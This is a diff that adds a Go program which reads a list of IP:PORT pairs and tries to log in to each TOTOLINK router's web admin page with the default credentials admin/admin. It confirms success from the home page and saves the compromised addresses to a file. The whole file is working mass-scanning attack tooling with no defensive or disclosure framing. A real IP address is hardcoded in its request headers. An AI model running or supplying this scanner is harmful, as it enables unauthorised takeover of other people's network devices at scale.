@@ -1,0 +1,111 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"net/http"
+	"os"
+	"strings"
+)
+
+func main() {
+	// Open and read the IPs from ips.txt file
+	file, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error opening ips.txt:", err)
+		return
+	}
+	defer file.Close()
+
+	// Create a file to save successful IP:PORT pairs
+	successfulFile, err := os.Create("successful.txt")
+	if err != nil {
+		fmt.Println("Error creating successful.txt:", err)
+		return
+	}
+	defer successfulFile.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		ipPort := scanner.Text()
+
+		// Split IP:PORT into separate parts
+		parts := strings.Split(ipPort, ":")
+		if len(parts) != 2 {
+			fmt.Println("Invalid IP:PORT format:", ipPort)
+			continue
+		}
+
+		ip := parts[0]
+		port := parts[1]
+
+		// Initial POST request
+		postURL := fmt.Sprintf("http://%s:%s/boafrm/formLogin", ip, port)
+		postPayload := []byte(`{"topicurl":"setting/setUserLogin","username":"admin","userpass":"admin","submit-url":"/login.htm"}`)
+
+		postReq, err := http.NewRequest("POST", postURL, bytes.NewBuffer(postPayload))
+		if err != nil {
+			fmt.Println("Error creating POST request:", err)
+			continue
+		}
+
+		postReq.Header.Set("Accept", "*/*")
+		postReq.Header.Set("X-Requested-With", "XMLHttpRequest")
+		postReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+		postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+		postReq.Header.Set("Origin", "http://91.242.87.211:8080")
+		postReq.Header.Set("Referer", "http://91.242.87.211:8080/login.htm")
+		postReq.Header.Set("Accept-Encoding", "gzip, deflate")
+		postReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		postReq.Header.Set("Connection", "close")
+		postReq.Header.Set("Content-Length", fmt.Sprintf("%d", len(postPayload)))
+
+		client := &http.Client{}
+		_, err = client.Do(postReq)
+		if err != nil {
+			fmt.Println("Error sending POST request:", err)
+			continue
+		}
+
+		// GET request after the POST
+		getURL := fmt.Sprintf("http://%s:%s/home.htm", ip, port)
+		getReq, err := http.NewRequest("GET", getURL, nil)
+		if err != nil {
+			fmt.Println("Error creating GET request:", err)
+			continue
+		}
+
+		getReq.Header.Set("Upgrade-Insecure-Requests", "1")
+		getReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+		getReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		getReq.Header.Set("Referer", "http://91.242.87.211:8080/login.htm")
+		getReq.Header.Set("Accept-Encoding", "gzip, deflate")
+		getReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		getReq.Header.Set("Connection", "close")
+
+		getResp, err := client.Do(getReq)
+		if err != nil {
+			fmt.Println("Error sending GET request:", err)
+			continue
+		}
+		defer getResp.Body.Close()
+
+		// Check if the response body contains the successful login indicator
+		buf := new(bytes.Buffer)
+		_, _ = buf.ReadFrom(getResp.Body)
+		getResponseBody := buf.String()
+
+		successfulLoginIndicator := "location.href='http://'+lan_ip+'/home.htm';"
+		if strings.Contains(getResponseBody, successfulLoginIndicator) {
+			fmt.Println("[TOTOLINK] successfully logged in to:", ipPort)
+			_, _ = fmt.Fprintf(successfulFile, "%s\n", ipPort)
+		} else {
+			fmt.Println("[TOTOLINK] login failed for:", ipPort)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading ips.txt:", err)
+	}
+}
